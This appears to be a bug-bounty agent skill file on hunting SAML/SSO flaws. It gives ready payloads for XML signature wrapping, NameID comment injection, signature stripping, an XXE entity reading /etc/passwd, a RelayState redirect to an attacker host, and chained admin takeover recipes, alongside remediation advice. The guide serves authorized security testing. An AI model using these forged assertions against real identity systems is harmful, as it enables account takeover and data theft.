---
name: hunt-saml
description: "Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW) — modify Assertion while keeping Signature valid by relocating signed element, comment injection in NameID (admin@target.com<!--evil-->@attacker.com → some parsers see admin@target.com), signature stripping (remove Signature element entirely, server should reject but doesn't), key confusion (signed by attacker's IdP, accepted by SP), audience-restriction not validated, replay attack (same Assertion accepted twice within validity window). Tools: SAML Raider Burp extension, samlmagic, manual XML manipulation. Detection: any /saml endpoint, /Shibboleth.sso, /sso/saml/, Microsoft ADFS endpoints. Validate: account takeover via altered NameID, admin role injection via altered AttributeStatement. Use when hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation."
sources: cve_database, oasis_saml_spec, academic_research, public_research, github_security_lab
report_count: 6
cwe: [CWE-347, CWE-345, CWE-287, CWE-611, CWE-290]
cvss_baseline: "High (8.1) assertion forgery to a normal user → Critical (9.8+) admin/any-user ATO or cross-tenant federation bypass. Non-security attribute tamper with no auth-decision change = Informational."
related_skills: [hunt-auth-bypass, hunt-ato, hunt-oauth, hunt-xxe, hunt-open-redirect, triage-validation]
---

## 20. SAML / SSO ATTACKS
> SSO bugs frequently pay High–Critical. XML parsers are notoriously inconsistent.

### Attack Surface
```bash
# Find SAML endpoints
cat recon/$TARGET/urls.txt | grep -iE "saml|sso|login.*redirect|oauth|idp|sp"
# Key endpoints: /saml/acs (assertion consumer service), /sso/saml, /auth/saml/callback
```

### Attack 1: XML Signature Wrapping (XSW)
```xml
<!-- BEFORE: valid assertion by user@company.com -->
<saml:Response>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid, covers ID=legit --></ds:Signature>
  </saml:Assertion>
</saml:Response>

<!-- AFTER: inject evil assertion. Signature still validates (covers #legit).
     App processes the FIRST assertion found = evil. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>  <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid --></ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### Attack 2: Comment Injection in NameID
```xml
<!-- Attacker registers/controls account: admin@company.com.evil.com -->
<NameID>admin@company.com<!---->.evil.com</NameID>
<!-- Signed canonical form (C14N without-comments strips the comment BEFORE
     digest): "admin@company.com.evil.com" — the value the signature covers. -->
<!-- App's XML processor also strips the comment but only reads the text node
     UP TO the comment boundary: "admin@company.com" — a DIFFERENT effective
     identity than was signed. The discrepancy is the bug. -->
<!-- Works when signer's C14N and app's text extraction disagree on comments.
     CVE-2017-11428 (Ruby-SAML / OneLogin), CVE-2016-5697. -->
```

### Attack 3: Signature Stripping
```
1. Decode SAMLResponse: echo "BASE64" | base64 -d | xmllint --format - > saml.xml
2. Delete the entire <Signature> element
3. Change NameID to admin@company.com
4. Re-encode: base64 -w0 saml.xml  (POST binding = raw base64, NO compression; Redirect binding uses raw DEFLATE — not gzip)
5. Submit — if server doesn't verify signature presence = admin ATO
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Assertion>
  <NameID>&xxe;</NameID>
</saml:Assertion>
```

### Attack 5: NameID Manipulation
```
Test these NameID values:
- admin@company.com (generic admin)
- administrator@company.com
- support@target.com
- Any email found in disclosed reports for this program
- ${7*7} (SSTI if NameID gets rendered in a template)
```

### Tools
```bash
# SAMLRaider (Burp extension) — automated XSW testing
# BApp Store → SAMLRaider → intercept SAMLResponse → SAML Raider tab

# Manual workflow:
echo "BASE64_SAML" | base64 -d > saml.xml
# Edit saml.xml
base64 -w0 saml.xml  # Re-encode
# URL-encode the result before sending as SAMLResponse parameter
```

### SAML Triage
```
XSW successful   = Critical (ATO any user)
Sig stripping    = Critical (ATO any user)
Comment injection = High (ATO admin)
XXE in assertion = High (file read / SSRF)
NameID manip     = Medium/High (depends on what NameID maps to)
```

### Attack 6: Parser-differential / canonicalization round-trip (2024-2025 wave)
The modern high-impact SAML bug class is a **parser differential**: the library verifies the signature over one DOM, then re-parses/re-serializes the document and reads attributes from a *different* DOM. Namespace tricks, nested elements, and C14N round-trips move the effective NameID without breaking the signature.
- **ruby-saml CVE-2024-45409** — improper verification let a crafted response forge a valid assertion (critical across GitLab/many Ruby apps). 
- **GitHub Enterprise Server XSW CVE-2025-25291 / CVE-2025-25292** (ruby-saml) — signature wrapping → authentication bypass / ATO.
- **samlify CVE-2025-47949** — signature-wrapping assertion forgery in the Node `samlify` library.
Probe: feed SAMLRaider's XSW1-XSW8 permutations AND namespace/round-trip variants; watch for any that authenticate as a different NameID.

### Attack 7: Condition / Recipient / InResponseTo validation gaps
Even with a valid signature, SPs must validate the assertion's *conditions*. Test each independently:
- **AudienceRestriction** not checked → an assertion minted for IdP-A's SP accepted by SP-B (cross-tenant).
- **NotBefore / NotOnOrAfter** not enforced → **assertion replay** outside the window; capture a valid assertion and resubmit hours later.
- **Recipient / Destination / InResponseTo** not bound → replay an IdP-initiated assertion against an SP-initiated flow, or cross-SP replay.
- **One-time-use (replay cache) absent** → same signed assertion accepted twice = ATO with a sniffed assertion.

### Attack 8: RelayState open redirect / injection
`RelayState` is attacker-influenceable and often used as the post-login redirect target → open redirect (`RelayState=//attacker`) that can steal the next auth artifact. Cross-ref `hunt-open-redirect`. Also test RelayState for stored XSS when reflected.

### Tooling (expanded)
- **SAMLRaider** (Burp) — XSW automation + cert cloning for key-confusion tests.
- **samling / samldumper / python3-saml test vectors** — craft assertions.
- **xmlsec1 / xmllint** — inspect C14N behavior and reproduce the signer-vs-reader differential locally.

### Remediation
- Verify the signature over the exact DOM that is used to read assertions (no re-parse between verify and read); use a hardened, patched SAML library.
- Enforce `wantAssertionsSigned`/`wantMessagesSigned`, reject unsigned/stripped assertions, pin the IdP certificate (no key-confusion), and validate Audience, Recipient, Destination, InResponseTo, and NotBefore/NotOnOrAfter.
- Maintain a one-time-use replay cache keyed on assertion ID; disable DOCTYPE/external entities in the XML parser (XXE).
- Allowlist RelayState redirect targets.

### Validation Gate
- Prove a crossed authorization boundary: authenticate as a *different* NameID / gain a role you shouldn't, in a test tenant. Capture the modified SAMLResponse and the resulting authenticated session.
- Non-security attribute changes (display name, locale) that don't alter NameID/AuthnContext/role attributes are Informational.

---

## Related Skills & Chains

- **`hunt-ato`** — SAML XSW with absent audience-restriction validation is the canonical SP-impersonation-of-admin chain. Chain primitive: XSW1 attack relocates signed assertion to a secondary position + injects evil assertion with `NameID=admin@target.com` in primary position + SP processes first assertion (the evil one) + SP doesn't validate `<AudienceRestriction>` so an assertion intended for IdP-A is accepted by SP-B → admin ATO across federated tenant boundary.
- **`hunt-auth-bypass`** — SAML signature-stripping is the textbook auth-bypass pattern; this skill provides the SAML mechanics, hunt-auth-bypass provides the broader bypass-discipline. Chain primitive: capture valid SAMLResponse → regex-strip `<ds:Signature>` element entirely → modify `<NameID>` to admin → re-encode base64 → POST to `/saml/acs` → SP wantAssertionsSigned=false silently accepts → admin session issued without any cryptographic challenge.
- **`hunt-oauth`** — SAML-fronted OAuth issuers turn assertion-level bugs into token-level ATO. Chain primitive: SP issues OAuth bearer tokens after SAML assertion validation + XSW alters NameID to admin → SP's token endpoint issues OAuth token bearing admin claims → all downstream OAuth-scoped APIs (admin API, billing API, user-management API) grant admin access from a single forged assertion.
- **`hunt-xxe`** — SAML assertions ARE XML; XXE in the assertion parser is a separate chain on top of XSW. Chain primitive: SAML parser without `disallow-doctype-decl` + `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in assertion + `<NameID>&xxe;</NameID>` → SP renders/logs NameID → /etc/passwd contents leak in error response or audit log → file-read primitive on SAML SP infrastructure.
- **`security-arsenal`** — Pull the SAML/XSW Payload Catalog (XSW1-XSW8 templates, comment-injection variants for libxml/Xerces/MSXML parser differences, signature-wrapping with multiple Reference elements, key-confusion payloads where attacker-IdP-signed assertions are accepted by trust-naive SPs) and the always-rejected list for "SAMLResponse accepted on the wrong endpoint" claims that don't actually validate.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on a SAML "vulnerability" that only modifies non-security-relevant attributes (display name, locale) without altering NameID, AuthnContext, or role-bearing AttributeStatements. Theoretical XML manipulation that doesn't cross an authorization boundary is Informational, not Critical — the auth-decision-changing step is the gate.
